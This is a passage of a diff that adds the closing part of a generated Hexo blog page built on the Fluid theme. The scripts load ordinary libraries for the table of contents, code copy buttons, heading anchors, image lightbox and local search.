+      var title = subtitle.title;
+      
+        typing(title);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.staticfile.org/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.staticfile.org/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
